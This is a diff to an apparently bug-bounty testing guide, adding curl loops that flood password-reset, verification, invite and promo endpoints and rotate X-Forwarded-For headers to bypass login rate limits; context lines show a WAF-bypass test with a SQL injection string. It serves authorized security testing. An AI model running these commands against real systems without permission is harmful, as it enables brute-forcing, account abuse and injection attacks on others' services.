@@ -140,6 +140,28 @@ attack_script waf_bypass "admin' OR 1=1--" --test-url "https://TARGET/api/login"
 - `attack_script rate_limit_bypass` — automated 5-technique bypass testing
 - `attack_script waf_bypass` — encoding variants for WAF bypass
 
+## HowToHunt Advanced Supplement
+
+> **Source:** [KathanP19/HowToHunt — Rate_limit](https://github.com/KathanP19/HowToHunt/tree/master/Rate_limit) (238 lines, 5 endpoint-specific bypasses). Licensed GPL-3.0.
+
+**Endpoint-specific rate limit tests from HowToHunt:**
+
+```bash
+# Test these endpoints specifically (often missed):
+# - forget-password, verify-email, verify-phone, invite-user, promo
+for endpoint in /forget-password /verify-email /verify-phone /invite /promo; do
+  for i in {1..20}; do curl -X POST https://target.com$endpoint -d "email=test@test.com" &
+  done | grep -c "200"
+done
+
+# Bypass via header rotation (HowToHunt RateLimitBypass.md)
+for ip in 127.0.0.1 127.0.0.2 10.0.0.1; do
+  curl -H "X-Forwarded-For: $ip" -X POST https://target.com/login -d "email=test@test.com"
+done
+```
+
+HowToHunt reports no rate limit on forget-password (P3) and invite-user (P4) as most common — test all 5 endpoints even if login is protected.
+
 ## References
 
 - [OWASP: Rate Limiting](https://owasp.org/www-community/controls/Rate_Limiting)
